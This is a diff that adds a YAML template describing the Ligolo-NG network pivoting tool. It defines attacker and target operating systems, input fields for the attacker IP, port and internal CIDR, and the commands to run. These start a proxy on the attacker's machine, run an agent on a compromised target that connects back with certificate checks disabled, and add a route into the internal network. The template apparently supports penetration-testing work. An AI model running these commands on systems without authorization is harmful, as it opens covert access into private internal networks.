@@ -1,0 +1,45 @@
+id: ligolo-ng
+name: Ligolo-NG
+description: >
+  TUN-based pivoting tool using a lightweight agent and proxy model.
+  Provides full IP-level access to internal networks.
+
+category: tun
+
+os:
+  attacker:
+    - linux
+  target:
+    - linux
+    - windows
+
+requires_root: true
+
+inputs:
+  attacker_ip:
+    label: Attacker IP
+    type: ip
+    required: true
+
+  attacker_port:
+    label: Proxy Port
+    type: port
+    default: 11601
+
+  pivot_cidr:
+    label: Pivot Network (CIDR)
+    type: cidr
+    required: true
+
+commands:
+  attacker:
+    - ligolo-proxy -selfcert -laddr {{attacker_ip}}:{{attacker_port}}
+
+  target:
+    - ligolo-agent -connect {{attacker_ip}}:{{attacker_port}} -ignore-cert
+
+  post:
+    - ip route add {{pivot_cidr}} dev ligolo
+
+notes:
+  - Root privileges are required on the attacker machine
